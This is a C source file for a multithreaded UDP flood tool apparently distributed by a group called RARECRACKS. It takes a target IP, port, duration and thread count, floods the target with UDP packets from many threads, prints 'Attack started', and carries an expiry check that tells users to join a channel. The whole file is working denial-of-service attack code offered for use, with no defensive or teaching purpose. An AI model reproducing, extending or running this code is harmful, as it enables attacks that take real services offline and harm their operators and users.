#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <zlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>

#define BUFFER_SIZE 10
#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 04

char *ip;
int port;
int duration;
char padding_data[2 * 1024 * 1024];
volatile sig_atomic_t stop_flag = 0;

unsigned long calculate_crc32(const char *data) {
    return crc32(0, (const unsigned char *)data, strlen(data));
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};   
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;  
    time(&now);   
    if (difftime(now, mktime(&expiration_date)) > 0) {
        fprintf(stderr, "This file is closed by RARECRACKS.\nJOIN CHANNEL TO USE THIS FILE.\n");
        exit(EXIT_FAILURE);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;
    cpu_set_t cpuset;
    
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu(), &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np failed");
        pthread_exit(NULL);
    }

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    int flags = fcntl(sock, F_GETFL, 0);
    if (flags < 0) {
        perror("fcntl F_GETFL failed");
        close(sock);
        pthread_exit(NULL);
    }
    if (fcntl(sock, F_SETFL, flags | O_NONBLOCK) < 0) {
        perror("fcntl F_SETFL failed");
        close(sock);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("");
        close(sock);
        pthread_exit(NULL);
    }

    snprintf(buffer, sizeof(buffer), "UDP traffic test");
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    while (time(NULL) < end_time && !stop_flag) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                perror("Send failed");
                break;
            }
        }
    }

    if (close(sock) < 0) {
        perror("Failed to close socket");
    }
    pthread_exit(NULL);
}

void *expiration_check_thread(void *arg) {
    while (!stop_flag) {
        check_expiration();
        sleep(3600);
    }
    pthread_exit(NULL);
}

void signal_handler(int signum) {
    stop_flag = 1;
}

int main(int argc, char *argv[]) {

    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        perror("signal setup failed");
        exit(EXIT_FAILURE);
    }

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int requested_threads = atoi(argv[4]);
    int actual_threads = (requested_threads == 1) ? 30 : requested_threads;

    check_expiration();
    printf("Attack started by @RARECRACKS\n");

    memset(padding_data, 0, sizeof(padding_data));
    unsigned long crc = calculate_crc32("RARECRACKS");
    // printf("RARECRACKS CRC32: %lx\n", crc);

    pthread_t tid[actual_threads];
    pthread_t exp_tid;

    if (pthread_create(&exp_tid, NULL, expiration_check_thread, NULL) != 0) {
        perror("Expiration check thread creation failed");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < actual_threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            stop_flag = 1;
            for (int j = 0; j < i; j++) {
                pthread_cancel(tid[j]);
                pthread_join(tid[j], NULL);
            }
            pthread_cancel(exp_tid);
            pthread_join(exp_tid, NULL);
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < actual_threads; i++) {
        pthread_join(tid[i], NULL);
    }

    stop_flag = 1;
    pthread_join(exp_tid, NULL);

    return 0;
}